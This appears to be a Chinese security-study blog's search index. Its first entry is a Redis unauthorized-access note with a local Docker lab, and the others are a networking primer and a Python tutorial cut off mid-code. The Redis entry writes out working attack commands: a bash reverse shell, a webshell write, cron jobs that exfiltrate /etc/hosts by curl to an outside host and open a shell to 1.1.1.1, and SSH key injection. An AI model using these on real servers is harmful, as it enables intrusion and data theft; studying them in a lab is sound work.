<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>未授权访问之redis</title>
      <link href="/posts/fac29bb7.html"/>
      <url>/posts/fac29bb7.html</url>
      
        <content type="html"><![CDATA[<h2 id="未授权访问"><a href="#未授权访问" class="headerlink" title="未授权访问"></a>未授权访问</h2><p>未授权访问，是指不进行请求授权的情况下对需要权限的功能进行访问执行。通常是由于认证页面存在缺陷，无认证，安全配置不当导致。常见与服务端口，接口无限制开放，网页功能通过链接无限制用户访问，低权限用户越权访问高权限功能。</p><p>未授权访问通常是会泄漏用户信息，系统信息。某些服务和系统中，未授权访问还可以执行系统命令，操作系统文件，导致系统的整体安全遭到破坏。</p><h3 id="Redis未授权访问"><a href="#Redis未授权访问" class="headerlink" title="Redis未授权访问"></a>Redis未授权访问</h3><p>Redis是一个开源的使用ANSI C语言编写的、支持网络、可基于内存亦可持久化的日志型Key-Value数据库，并提供多种语言的API。</p><p>Redis因配置不当可以未授权访问。攻击者无需认证访问到内部数据，可导致敏感数据泄漏，也可以恶意执行操作。</p><p>Redis 默认情况下，会绑定在 0.0.0.0:6379，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip  访问等，这样将会将 Redis  服务暴露到公网上，如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取  Redis 的数据。攻击者在未授权访问 Redis 的情况下，利用 Redis 自身的提供的config  命令，可以进行写文件操作，攻击者可以成功将自己的ssh公钥写入目标服务器的 &#x2F;root&#x2F;.ssh 文件夹的authotrized_keys  文件中，进而可以使用对应私钥直接使用ssh服务登录目标服务器、添加计划任务、写入Webshell等操作。</p><p><a href="http://xz.aliyun.com/t/6103?u_atoken=6158552e3f7d3285bca88033f9ac20e9&u_asig=0a472f8317317457697842968e004c#toc-0">常见未授权访问漏洞总结</a></p><p>首先本地搭建redis环境，本机为linux所有利用docker来搭建</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 利用docker去拉去镜像</span></span><br><span class="line"><span class="comment"># 拉取镜像</span></span><br><span class="line">docker pull sqlsec/redis5-centos7-cron:latest</span><br><span class="line"><span class="comment"># 创建容器</span></span><br><span class="line">docker run -d -p 6379:6379 sqlsec/redis5-centos7-cron:latest</span><br><span class="line"><span class="comment"># 连接redis服务</span></span><br><span class="line">redis-cli -h 192.168.1.1</span><br><span class="line"><span class="comment"># 利用info可以查看基本信息</span></span><br><span class="line">info</span><br><span class="line"></span><br><span class="line"><span class="comment"># 或者本地起redis服务，使用linux系统</span></span><br><span class="line"><span class="built_in">sudo</span> apt update</span><br><span class="line"><span class="built_in">sudo</span> apt install redis</span><br><span class="line"><span class="comment"># 开启服务</span></span><br><span class="line">redis-server</span><br><span class="line"><span class="comment"># 连接服务</span></span><br><span class="line">redis-cli</span><br><span class="line"></span><br><span class="line"><span class="comment"># redis基本语法，set设置键值对，get可以获取,del删除key</span></span><br><span class="line"><span class="built_in">set</span> key value</span><br><span class="line">get key</span><br><span class="line">del key</span><br><span class="line"><span class="comment"># 清除所有变量</span></span><br><span class="line">FLUSHALL</span><br><span class="line"><span class="comment"># 获取当前数据库的运行路径</span></span><br><span class="line">config get <span class="built_in">dir</span></span><br><span class="line">config <span class="built_in">set</span> <span class="built_in">dir</span> /xx/xx/</span><br><span class="line"><span class="comment"># 默认键值对保存路径</span></span><br><span class="line">config get dbfilename</span><br><span class="line">config <span class="built_in">set</span> dbfilename xx.php</span><br><span class="line"><span class="comment"># 将set的键值对保存到dbfilename</span></span><br><span class="line">save</span><br><span class="line"></span><br><span class="line"><span class="comment"># redis的配置文件 </span></span><br><span class="line">vim /etc/redis/redis.conf</span><br><span class="line"><span class="comment"># 添加一句可以对redis服务加密</span></span><br><span class="line">requirepass tjw</span><br><span class="line"><span class="comment"># 此时就需要认证</span></span><br><span class="line">AUTH tjw</span><br></pre></td></tr></table></figure><p>redis漏洞的打法</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># bash 弹shell</span></span><br><span class="line"><span class="comment"># 在本机输入以下命令，即可</span></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/目标ip/目标端口 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 假如开起了web服务，那么可以写webshell</span></span><br><span class="line">config <span class="built_in">set</span> <span class="built_in">dir</span> /var/www/html</span><br><span class="line">config <span class="built_in">set</span> dbfilename info.php</span><br><span class="line"><span class="built_in">set</span> x <span class="string">&quot;&lt;?php info();?&gt;&quot;</span></span><br><span class="line">save</span><br><span class="line"></span><br><span class="line"><span class="comment"># linux写定时任务来反弹shell</span></span><br><span class="line">flushall</span><br><span class="line">config <span class="built_in">set</span> <span class="built_in">dir</span> /dir/spool/cron</span><br><span class="line">config <span class="built_in">set</span> dbfilename root</span><br><span class="line"><span class="built_in">set</span> x <span class="string">&quot;\n\n\n* * * * * curl http://dixsmz.ceye.io/?r=<span class="subst">$(cat /etc/hosts|base64|tr &#x27;\n&#x27; &#x27;-&#x27;)</span>\n\n\n&quot;</span></span><br><span class="line">save</span><br><span class="line"><span class="comment"># 反弹shell</span></span><br><span class="line">\n\n\n* * * * * /bin/bash -i &gt;&amp; /dev/tcp/1.1.1.1/2333 0&gt;&amp;1\n\n\n</span><br><span class="line"><span class="comment"># 本机监听；l监听本地，v日志输出，p监听端口</span></span><br><span class="line">ncat -lvp 2333</span><br><span class="line"></span><br><span class="line"><span class="comment"># 未授权访问修改公私钥</span></span><br><span class="line"><span class="comment"># 生成公私钥</span></span><br><span class="line">ssh-keygen</span><br><span class="line"><span class="comment"># 生成两个文件，一个公钥=锁，一个私钥=钥匙</span></span><br><span class="line">id_rsa/id_rsa.pub</span><br><span class="line"><span class="comment"># 漏洞操作</span></span><br><span class="line"><span class="comment"># 设置要操作的路径</span></span><br><span class="line">config <span class="built_in">set</span> <span class="built_in">dir</span> /root/.ssh/</span><br><span class="line"><span class="comment"># 设置要操作的文件</span></span><br><span class="line">config <span class="built_in">set</span> dbfilename authorized_keys</span><br><span class="line"><span class="comment"># 写公钥的值</span></span><br><span class="line"><span class="built_in">set</span> x <span class="string">&quot;\n\n\nssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINatA+z3+HZYrFH48ybpicJd+QhWsl9iKkuuxKGlQvaq tong@tong</span></span><br><span class="line"><span class="string">\n\n\n&quot;</span></span><br><span class="line"><span class="comment"># 将公钥的值保存到要操作的文件</span></span><br><span class="line">save</span><br></pre></td></tr></table></figure><p>关于Linux的定时任务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看定时任务列表</span></span><br><span class="line">crontab -l</span><br><span class="line"><span class="comment"># 创建定时任务</span></span><br><span class="line">crontab -e</span><br><span class="line"></span><br><span class="line">crontab示例</span><br><span class="line"><span class="comment"># 1.每分钟执行一次myCommand</span></span><br><span class="line">* * * * * myCommand</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.每小时的第三和第十五分钟执行</span></span><br><span class="line">3,15 * * * * myCommand</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3.上午八点到十一点的第三和第十五分钟执行</span></span><br><span class="line">3,15 8-11 * * * myCommand</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4.每隔两天的上午八点到十一点的第三和第十五分钟执行</span></span><br><span class="line">3,15 8-11 */2 * * myCommand</span><br><span class="line"></span><br><span class="line"><span class="comment"># 5.每周一上午八点到十一点的第三和第十五分钟执行</span></span><br><span class="line">3,15 8-11 * * 1 myCommand</span><br><span class="line"></span><br><span class="line"><span class="comment"># 6.每晚的21:30重启smb</span></span><br><span class="line">30 21 * * * /etc/init.d/smb restart</span><br><span class="line"></span><br><span class="line"><span class="comment"># 7.每月1、10、22日的4:45重启smb</span></span><br><span class="line"> 45 4 1,10,22 * * /etc/init.d/smb restart</span><br><span class="line"> </span><br><span class="line"> <span class="comment"># 8.每周六、周日的1:10重启smb</span></span><br><span class="line"> 10 1 * * 6,0 /etc/init.d/smb restart</span><br><span class="line"> </span><br><span class="line"> <span class="comment"># 9.每天18:00至23:00之间每隔30分钟重启smb</span></span><br><span class="line"> 0,30 18-23 * * * /etc/init.d/smb restart</span><br><span class="line"> </span><br><span class="line"> <span class="comment"># 10.每星期六的晚上23:00重启smb</span></span><br><span class="line"> 0 23 * * 6 /etc/init.d/smb restart</span><br><span class="line"> </span><br><span class="line"> <span class="comment"># 11.每一小时重启smb</span></span><br><span class="line"> 0 */1 * * * /etc/init.d/smb restart</span><br><span class="line"> </span><br><span class="line"> <span class="comment"># 12.晚上11点到早上7点之间，每隔一小时重启</span></span><br><span class="line"> 0 23-7 * * * /etc/init.d/smb restart</span><br></pre></td></tr></table></figure><p>关于nc工具，这里参考国光师傅的文章：<a href="https://www.sqlsec.com/2019/10/nc.html">nc 命令教程 | 国光</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> redis </tag>
            
            <tag> web </tag>
            
            <tag> 未授权访问 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络基础</title>
      <link href="/posts/91149a63.html"/>
      <url>/posts/91149a63.html</url>
      
        <content type="html"><![CDATA[<h1 id="网络基础"><a href="#网络基础" class="headerlink" title="网络基础"></a>网络基础</h1><h2 id="http协议"><a href="#http协议" class="headerlink" title="http协议"></a>http协议</h2><p>简介：http协议，超文本传输协议。用于从万维网（www）服务器传输超文本到本地浏览器的传送协议。</p><p>超文本：一种可以链接到另一个文档或文本的文本。这种链接是通过特殊的标记或代码实现的，允许用户通过点击这些链接来跳转到其他内容，而无需离开当前页面或文档。</p><p>http工作于客户端-服务器（B&#x2F;S）架构上。</p><p>工作原理：浏览器作为http客户端通过url 向http服务即web 服务器发送所有请求。web服务器根据接收到的请求后，向客户端发送响应信息。</p><h2 id="http协议求情方法"><a href="#http协议求情方法" class="headerlink" title="http协议求情方法"></a>http协议求情方法</h2><h3 id="GET"><a href="#GET" class="headerlink" title="GET"></a>GET</h3><p>用途：用于请求指定的资源。这是最常见的请求方法，当在浏览器中输入网址并访问时，通常会发送GET请求。</p><p>特点：</p><ol><li>GET请求可以被缓存，除非指定了特定的缓存控制头部</li><li>GET请求的参数通常附加在URL中，这使得它们可以被轻松的分享和书签（收藏），但也可能会暴露敏感信息，并且有长度限制。</li><li>GET请求是安全的，即它不会对服务器上的资源进行修改。</li></ol><h3 id="POST"><a href="#POST" class="headerlink" title="POST"></a>POST</h3><p>用途：通常用于向服务器提交数据，以创建或更新资源。例如：在提交表单、上传文件等场景使用。</p><p>特点：</p><ol><li>POST请求的数据通常放在请求体中，而不是URL中，因此可以传输更大量的数据，并且相对更安全，不容易暴露敏感信息</li><li>POST请求一般不会被缓存</li></ol><h3 id="PUT"><a href="#PUT" class="headerlink" title="PUT"></a>PUT</h3><p>用途：用于更新服务器上的资源，PUT请求通常会将整个资源进行替换。</p><p>特点：PUT请求是幂等的，即多次发送相同的PUT请求应该产生相同的结果。</p><h3 id="DELETE"><a href="#DELETE" class="headerlink" title="DELETE"></a>DELETE</h3><p>用途：用于删除服务器上的指定资源。</p><p>特点：DELETE请求也是幂等的，多次删除同一个资源应该产生相同的结果，即资源被删除后再次删除不会产生错误。</p><h3 id="HEAD"><a href="#HEAD" class="headerlink" title="HEAD"></a>HEAD</h3><p>用途：与GET请求类似，但只返回头部信息，不返回资源的主体内容</p><p>特点：可以用于检查资源的存在性&#x2F;获取资源的元信息（如修改时间、内容长度等），而无需下载整个资源，从而节省了带宽和时间。</p><h3 id="OPTIONS"><a href="#OPTIONS" class="headerlink" title="OPTIONS"></a>OPTIONS</h3><p>用途：用于获取服务器支持的HTTP 请求方法和其他选项。</p><p>特点：客户端可以通过OPTIONS 请求了解服务器对特定资源的访问权限和支持的操作。</p><h3 id="TRACE"><a href="#TRACE" class="headerlink" title="TRACE"></a>TRACE</h3><p>用途：用于诊断和调试，客户端可以发送TRACE请求来查看请求在网络中经过的路径</p><p>特点：通常在开发和测试环境中使用，以了解请求处理的过程</p><h3 id="HTTP之URL"><a href="#HTTP之URL" class="headerlink" title="HTTP之URL"></a>HTTP之URL</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://www.baidu.com/web/579.html?replytocom=22#respond</span><br><span class="line">协议://域名:端口/虚拟目录/文件名?参数#锚点</span><br></pre></td></tr></table></figure><h2 id="HTTP协议状态码"><a href="#HTTP协议状态码" class="headerlink" title="HTTP协议状态码"></a>HTTP协议状态码</h2><p>用于表示服务器对请求的处理结果。</p><h3 id="1xx：信息性状态码"><a href="#1xx：信息性状态码" class="headerlink" title="1xx：信息性状态码"></a>1xx：信息性状态码</h3><p>100 continue：表示目前为止一切正常，客户端可以继续发送请求或者忽略这个响应，一般客户端发送POST请求时，当请求体比较大，服务器可能先返回这个状态码，表示可以继续发送请求体。</p><h3 id="2xx：成功状态码"><a href="#2xx：成功状态码" class="headerlink" title="2xx：成功状态码"></a>2xx：成功状态码</h3><p>200 ok：最常见的成功状态码，表示请求已成功，服务器已成功返回请求的数据。</p><p>201 created：表示请求已成功，并在服务器创建新的资源，通常在POST请求用于闯将资源时返回。</p><p>204 no content：表示请求已成功处理，但没有返回任何内容。通常用于PUT 或 DELETE请求成功后，表示资源已被更新或删除。</p><h3 id="3xx：重定向状态码"><a href="#3xx：重定向状态码" class="headerlink" title="3xx：重定向状态码"></a>3xx：重定向状态码</h3><p>301 moved permanently：表示请求的资源已被永久移动到新的URL,客户端应使用新的URL进行后续请求。</p><p>302 found：表示请求的资源临时被移动到了另一个URL，客户端应继续使用原有URL进行请求，但可以根据响应中的location头部字段进行重定向。</p><p>304 not modified：表示资源未被修改，客户端可以使用缓存的版本。通常在客户端发送条件请求（如带有if-modified-since 或 if-none-match 头部）时返回。</p><h3 id="4xx：客户端错误状态码"><a href="#4xx：客户端错误状态码" class="headerlink" title="4xx：客户端错误状态码"></a>4xx：客户端错误状态码</h3><p>400 bad request：表示客户端发送的请求有语法错误或无法被服务器理解。</p><p>401 unauthorized：表示请求需要用户认证，通常是因为客户端没有提供有效的身份验证凭证。</p><p>403 forhidden：表示服务器理解请求，但拒绝执行，通常是因为客户端没有足够的权限访问资源。</p><p>404 not found：表示服务器无法找到请求的资源。</p><p>405 method not allowed：表示请求的方法不被允许，例如使用了不支持的http 方法请求某个资源。</p><h3 id="5xx：服务器错误状态码"><a href="#5xx：服务器错误状态码" class="headerlink" title="5xx：服务器错误状态码"></a>5xx：服务器错误状态码</h3><p>500 internal server error：表示服务器在处理请求时发生了内部错误，通常时服务器端的程序出现了异常。</p><p>502 bad gateway：表示作为网关或代理的服务器在尝试执行请求时，从上游服务器接收到无效的响应。</p><p>503 service unavailable：表示服务器暂时无法处理请求，通常是由于服务器过载或正在进行维护。</p><p>504 gateway timeout：表示作为网关或代理的服务器在等待上游服务器响应时超时。</p><h2 id="内网"><a href="#内网" class="headerlink" title="内网"></a>内网</h2><p>内网（Internal Network），又称局域网（Local Area Network, LAN），是指在一个相对封闭的地理区域内构建的计算机网络。这个区域可以是一个办公室、一栋大楼、一个校园或者一个工厂等。内网的主要特点是：</p><ol><li>地理范围有限：通常覆盖的地理范围较小，不像互联网那样全球范围连接。</li><li>访问控制：内网通常受到严格的访问控制，只有授权的用户才能访问网络资源。</li><li>数据传输速度快：由于覆盖范围小，内网的数据传输速度通常比互联网要快。</li><li>私有性：内网主要用于组织内部的通信和资源共享，不对外公开。</li><li>安全性：内网的安全性通常比互联网要高，因为它们不直接暴露在公共网络中，减少了外部攻击的风险。</li></ol><p>内网可以用于文件共享、打印服务、内部通信和协作工具等，是现代办公环境中不可或缺的一部分。</p><h2 id="外网"><a href="#外网" class="headerlink" title="外网"></a>外网</h2><p>外网，通常指的是广域网（Wide Area Network, WAN），它是一个覆盖广泛地理区域的计算机网络。与内网（局域网）相比，外网的特点如下：</p><ol><li>地理范围广泛：外网可以跨越城市、国家甚至全球，连接不同的局域网和计算机系统。</li><li>公共访问：外网通常对公众开放，用户可以通过互联网服务提供商（ISP）连接到外网。</li><li>数据传输速度：由于覆盖范围广，外网的数据传输速度可能不如局域网快，受到网络带宽和距离的影响。</li><li>开放性：外网是开放的，任何人都可以通过合法途径接入，因此安全性相对较低。</li><li>成本：由于需要跨越长距离传输数据，外网的建设和维护成本通常较高。</li><li>服务多样性：外网提供了丰富的服务，如电子邮件、在线视频、网页浏览、在线购物等。</li><li>依赖性：外网依赖于各种网络技术和协议，如TCP&#x2F;IP协议，以及各种路由器和交换机等网络设备。</li></ol><p>外网的一个典型例子就是互联网（Internet），它是一个全球性的网络，连接了世界各地的计算机和服务器，允许用户访问和共享信息。互联网是外网技术的一个具体实现，也是最广为人知的外网形式。</p><p>公网地址，通常指的是在互联网上可以被全球任何地方访问的IP地址。这种地址是唯一的，并且可以在全球范围内被识别和路由。</p><p>私网地址，也称为私有IP地址，是指在互联网上不被直接路由的IP地址，它们仅在局域网（Local Area Network, LAN）或私有网络内部使用。私网地址的主要目的是为了节省公共IP地址资源，并确保内部网络的安全性。</p><p>10.0.0.0-10.255.255.255</p><p>172.16.0.0-172.31.255.255</p><p>192.168.0.0-192.168.255.255</p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> 网络 </tag>
            
            <tag> http </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python</title>
      <link href="/posts/a4d4b8b8.html"/>
      <url>/posts/a4d4b8b8.html</url>
      
        <content type="html"><![CDATA[<h1 id="python"><a href="#python" class="headerlink" title="python"></a>python</h1><span id="more"></span><h1 id="第一章"><a href="#第一章" class="headerlink" title="第一章"></a>第一章</h1><p>计算机不能直接执行程序员写代码，需要通过python解释器将源代码解释翻译成计算机可以执行的二进制码。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;hello,word!&quot;</span>)</span><br></pre></td></tr></table></figure><!--more--><p>注意事项：</p><ol><li><p>python严格区分大小写，无论是关键词还是自定义的变量，都严格区分。</p></li><li><p>python程序可以不用带“;”。（通常不写）</p></li></ol><h2 id="pycharm常用快捷键"><a href="#pycharm常用快捷键" class="headerlink" title="pycharm常用快捷键"></a>pycharm常用快捷键</h2><ol><li>删除当前行：shift + delete</li><li>复制当前行：ctrl + d</li><li>添加注释：ctrl + &#x2F;</li><li>快速格式化代码：ctrl + alt + L</li><li>自定义快捷键，运行：alt + r</li><li>查看一个类的层级关系：ctrl + h（学习OOP继承，使用）</li><li>查找：ctrl + f；替换：ctrl + r</li></ol><h2 id="python转义字符"><a href="#python转义字符" class="headerlink" title="python转义字符"></a>python转义字符</h2><ol><li>\t：制表位</li><li>\n：换行符</li><li>\r：一个回车</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 代码</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;jack\t20&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;hello,jack\nhello,tom&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;D:\\python\\python_code\\hello.py&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;tom say:\&quot;you are handsome?\&quot;&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;yes,\rno&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行结果</span></span><br><span class="line">jack<span class="number">20</span></span><br><span class="line">hello,jack</span><br><span class="line">hello,tom</span><br><span class="line">D:\python\python_code\hello.py</span><br><span class="line">tom say:<span class="string">&quot;you are handsome?&quot;</span></span><br><span class="line">no</span><br></pre></td></tr></table></figure><h1 id="第二章"><a href="#第二章" class="headerlink" title="第二章"></a>第二章</h1><h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><p>变量三要素：类型、名称、值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 定义了一个变量，变量名称a，变量的值是1，1类型是int型</span></span><br><span class="line"><span class="comment"># a指向一个空间，空间里面存放着1</span></span><br><span class="line">a = <span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(a))</span><br></pre></td></tr></table></figure><p>概念：</p><ol><li>变量相当于内存中一个数据存储空间的表示；</li><li>变量相当于房间的门牌号，通过门牌号我们可以找到房间，而通过变量名可以访问到变量（值）。</li></ol><h2 id="格式化输出"><a href="#格式化输出" class="headerlink" title="格式化输出"></a>格式化输出</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 格式化输出</span></span><br><span class="line">age = <span class="number">80</span></span><br><span class="line">score = <span class="number">77.5</span></span><br><span class="line">gender = <span class="string">&#x27;男&#x27;</span></span><br><span class="line">name = <span class="string">&quot;贾宝玉&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># %操作符</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;个人信息：%s-%d-%s-%.2f&quot;</span> % (name, age, gender, score))</span><br><span class="line"><span class="comment"># format()函数</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;个人信息：&#123;&#125;/&#123;&#125;/&#123;&#125;/&#123;&#125;&quot;</span>.<span class="built_in">format</span>(name,age,gender,score))</span><br><span class="line"><span class="comment"># f-strings（推荐）</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;个人信息：<span class="subst">&#123;name&#125;</span>,<span class="subst">&#123;age&#125;</span>,<span class="subst">&#123;score&#125;</span>,<span class="subst">&#123;gender&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出</span></span><br><span class="line">个人信息：贾宝玉-<span class="number">80</span>-男-<span class="number">77.50</span></span><br><span class="line">个人信息：贾宝玉/<span class="number">80</span>/男/<span class="number">77.5</span></span><br><span class="line">个人信息：贾宝玉,<span class="number">80</span>,<span class="number">77.5</span>,男</span><br></pre></td></tr></table></figure><h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><p>字节（byte）：计算机中基本存储单元</p><p>位（bit）：计算机中的最小存储单位</p><p>1 byte&#x3D; 8 bit</p><ol><li><p>整型 int</p><p>可以表示很大的数（官方：Exceeds the limit (4300 digits) for integer string conversion）。</p><p>（1）字节数随着数字增大而增大（即：python整型是变长的）</p><p>（2）每次增量是4个字节</p><p>（3）在python中可以通过sys.getsizeof返回对象（数据）的大小（以字节返回）</p></li><li><p>浮点型 float</p><p>（1）浮点数表示形式：5.12   .512</p><p>（2）科学计数法形式：5.12e2，5.12E-2</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">n1 = <span class="number">5.12e2</span> <span class="comment"># 5.12 * 10的2次方</span></span><br><span class="line">n2 = <span class="number">5.12E-2</span> <span class="comment"># 5.12 * 10的-2次方</span></span><br></pre></td></tr></table></figure><p>（3）浮点数由大小限制</p><p>（4）浮点类型计算之后，存在精度损失，可以使用decimal类进行精度计算</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">b = Decimal(<span class="string">&quot;8.1&quot;</span>) / Decimal(<span class="string">&quot;3&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;b = &quot;</span>, b)</span><br></pre></td></tr></table></figure></li><li><p>布尔类型 bool</p><p>（1）取值True 和 False（属于关键字）</p><p>（2）一般用于逻辑运算</p><p>（3）非0被视为真值，0值被视为假值</p></li><li><p>字符串 string</p><p>（1）python不支持单字符类型，一个字符也属于字符串</p><p>（2）使用三个’’’内容’’’，或者三个双引号”””内容”””可以使字符串内容原样输出</p><p>（3）在字符串前面添加 r ，可以使整个字符串不会被转义</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">str3 = <span class="string">r&quot;jack\ntom\tking&quot;</span></span><br><span class="line"><span class="built_in">print</span>(str3)</span><br></pre></td></tr></table></figure><p>（4）字符串驻留机制</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">s1 = <span class="number">1</span></span><br><span class="line">s2 = <span class="number">1</span></span><br><span class="line"><span class="comment"># id()函数是，可以返回对象/数据的内存地址</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;s1的地址：&quot;</span>,<span class="built_in">id</span>(s1))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;s2的地址：&quot;</span>,<span class="built_in">id</span>(s2))</span><br><span class="line"><span class="comment"># 输出内容</span></span><br><span class="line">s1的地址： <span class="number">140733327336360</span></span><br><span class="line">s2的地址： <span class="number">140733327336360</span></span><br></pre></td></tr></table></figure></li><li><p>数据类型转换</p><p>（1）隐式转换</p><p>​python根据该变量的当前值，决定数据类型。</p><p>​运算时，数据类型会向高精度转换，float的精度高于int。</p><p>（2）显式转换</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">i = <span class="number">10</span></span><br><span class="line"></span><br><span class="line">j = <span class="built_in">float</span>(i) <span class="comment"># 强制转换为float</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(j),j)</span><br><span class="line"></span><br><span class="line">k = <span class="built_in">str</span>(i) <span class="comment">#强制转换为str</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(k),k)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">int</span>(k) + <span class="number">90</span>) <span class="comment"># 